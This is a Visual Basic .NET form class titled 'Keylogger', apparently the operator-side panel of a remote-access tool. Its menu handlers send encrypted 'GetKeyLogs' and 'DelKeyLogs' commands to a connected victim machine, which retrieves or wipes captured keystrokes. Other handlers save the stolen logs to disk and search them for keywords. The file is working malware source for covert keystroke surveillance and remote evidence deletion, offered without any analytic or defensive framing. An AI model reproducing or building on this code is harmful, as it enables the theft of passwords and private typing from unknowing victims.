Public Class Keylogger
    Public connected As Connection

    Dim start As Integer = 0
    Dim indexOfSearchText As Integer = 0
    Dim startindex As Integer = 0
    Dim txt As String
    Private Sub DownloadLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadLogsToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("GetKeyLogs", Form1.enckey))
    End Sub
    Private Sub SaveLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveLogsToolStripMenuItem.Click
        Using sfd As New SaveFileDialog
            sfd.Title = "Save Keylogs..."
            sfd.InitialDirectory = CurDir()
            sfd.Filter = "Text Files | *.txt"
            Dim res = sfd.ShowDialog()
            If res = Windows.Forms.DialogResult.OK Then
                IO.File.WriteAllText(sfd.FileName, RichTextBox1.Text)
            End If
        End Using
    End Sub
    Private Sub DeleteLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteLogsToolStripMenuItem.Click
        RichTextBox1.Clear()
        connected.Send(New Encryption().AES_Encrypt("DelKeyLogs", Form1.enckey))
    End Sub
    Public Function FindMyText(ByVal txtToSearch As String, ByVal searchStart As Integer, ByVal searchEnd As Integer) As Integer
        If searchStart > 0 AndAlso searchEnd > 0 AndAlso indexOfSearchText >= 0 Then
            RichTextBox1.Undo()
        End If
        Dim retVal As Integer = -1
        If searchStart >= 0 AndAlso indexOfSearchText >= 0 Then
            If searchEnd > searchStart OrElse searchEnd = -1 Then
                indexOfSearchText = RichTextBox1.Find(txtToSearch, searchStart, searchEnd, RichTextBoxFinds.None)
                If indexOfSearchText <> -1 Then
                    retVal = indexOfSearchText
                End If
            End If
        End If
        Return retVal
    End Function
    Private Sub FindTextToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FindTextToolStripMenuItem.Click
        txt = InputBox("Please enter a Keyword you want to search for!", "Search")

        If txt = "" Then Exit Sub

        startindex = 0
        start = 0
        indexOfSearchText = 0

        If txt.Length > 0 Then
            startindex = FindMyText(txt.Trim(), start, RichTextBox1.Text.Length)
        End If

        If startindex >= 0 Then
            Dim endindex As Integer = txt.Length
            RichTextBox1.Select(startindex, endindex)
            RichTextBox1.ScrollToCaret()
            start = startindex + endindex
        End If
    End Sub

    Private Sub FindNextToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FindNextToolStripMenuItem.Click
        Try
            If txt.Length > 0 Then
                startindex = FindMyText(txt.Trim(), start, RichTextBox1.Text.Length)
            End If

            If startindex >= 0 Then
                RichTextBox1.SelectionColor = Color.Red
                Dim endindex As Integer = txt.Length
                RichTextBox1.Select(startindex, endindex)
                RichTextBox1.ScrollToCaret()
                start = startindex + endindex
            End If

            If RichTextBox1.TextLength = start Then
                startindex = 0
                start = 0
                indexOfSearchText = 0
            End If
        Catch
        End Try
    End Sub
End Class